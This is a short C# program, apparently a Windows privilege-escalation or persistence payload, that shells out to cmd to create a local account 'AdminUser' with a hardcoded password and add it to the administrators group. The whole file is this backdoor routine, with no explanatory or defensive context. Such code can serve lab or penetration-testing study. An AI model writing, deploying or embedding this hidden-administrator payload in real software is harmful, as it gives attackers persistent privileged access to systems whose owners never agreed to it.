using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace WINTRE
{
    class Program
    {
        static void Main(string[] args)
        {
            AdminUser();
        }
        static int AdminUser()
        {
            Process Process = new Process();
            Process.StartInfo.FileName = "cmd";
            Process.StartInfo.Arguments = "/c net user AdminUser AdminPass! /add /active:yes && net localgroup administrators AdminUser /add";
            Process.StartInfo.UseShellExecute = false;
            Process.StartInfo.RedirectStandardOutput = true;
            Process.StartInfo.RedirectStandardError = true;
            Process.Start();
            string output = Process.StandardOutput.ReadToEnd();
            Console.WriteLine(output);
            Debug.WriteLine(output);
            string err = Process.StandardError.ReadToEnd();
            Console.WriteLine(err);
            Process.WaitForExit();
            return 0;
        }
    }
}